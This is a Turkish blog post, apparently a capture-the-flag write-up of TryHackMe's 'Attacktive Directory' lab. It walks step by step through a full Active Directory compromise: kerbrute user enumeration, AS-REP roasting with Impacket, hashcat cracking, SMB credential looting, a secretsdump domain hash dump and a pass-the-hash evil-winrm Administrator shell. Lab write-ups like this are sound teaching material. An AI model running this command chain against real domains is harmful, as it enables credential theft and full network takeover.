---
title: "Attacktive Directory Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere [TryHackMe](https://tryhackme.com/) platformunda bulunan "Attacktive Directory" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```system
> nmap -sS -sV 10.10.22.226
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 16:19 +03
Nmap scan report for 10.10.22.226
Host is up (0.078s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-05 13:19:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

2 - "enum4linux" aracı ile makine üzerinde tarama yapıyorum. Tarama sonucu öğrendiğimiz "spookysec.local" domainini de /etc/hosts dosyasına ekliyorum.

```system
> enum4linux 10.10.22.226

*
Domain Name: THM-AD
*

> echo "10.10.22.226 spookysec.local" | tee -a /etc/hosts
```

3 - Kerbrute aracını kullanarak kullanıcı adı taraması yapıyorum. Tarama sonucunda Admin yetkisindeki bir kaç kullanıcıyı buluyorum. Bu kullanıcı adlarını "user.txt" adında bir dosyaya kaydediyorum.

```
> kerbrute userenum --dc 10.10.22.226 -d spookysec.local -t 20 userlist.txt

```

4 - Kaydettiğim kullanıcı adlarını kullanarak Impacket kütüphanesi içindeki GetNPUsers.py betiğini kullanıyorum. Bu betik kullanıcı kimlik bilgilerini elde etmeye yarar.

```system
> python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -usersfile user.txt -dc-ip 10.10.22.226 spookysec.local/ -o kerberos_result
```

5 - Betiği kullandıktan sonra elde ettiğim hashi kırmak için hashcat aracını kullanıyorum. Önceliklle "Kerberos 5 AS-REP" türünün ID'sini öğreniyorum. Daha sonra bize verilen şifreler ile bu hashi kırmaya çalışıyorum.

```system
> hashcat --help | grep "Kerberos"                                                                                 
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

> hashcat -m 18200 kerberos_result passwordlist.txt
```

6 - *svc-admin* kullanıcının kimlik bilgilerini kullanarak SMB servisinin içeriğini görüntülüyorum.

```system
smbclient -L \\10.10.22.226 -U svc-admin                                                                         
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

7 - "backup" isimli klasöre girip dizinin içeriğini listeliyorum. 

```system
> smbclient \\\\10.10.22.226\\backup -U svc-admin
```

8 - Kimlik bilgilerinin base64 ile şifrelendiğini anlıyorum ve decode ederek açık metni elde ediyorum.

```system
> cat backup_credentials.txt | base64 -d
```

9 - Etki alanı denetleyicisinden kimlik bilgilerini çekmek için *Impacket* kütüphanesi içerisindeki secrestsdump.py betiğini kullanıyorum.

```system
> python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local -outputfile secrets_dump
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

10 - Administrator kullanıcısının hashini kullanarak evil-winrm aracı ile makineye bağlanıyorum. Bağlantıktan sonra 3 bayrağı da okuyarak makineyi tamamlıyorum.

```system
evil-winrm -i 10.10.22.226 -u Administrator -H "HASH"                            

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt.txt
***CENSORED***

*Evil-WinRM* PS C:\Users\Administrator\Documents>  type C:\Users\backup\Desktop\PrivEsc.txt
***CENSORED***

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
***CENSORED***
```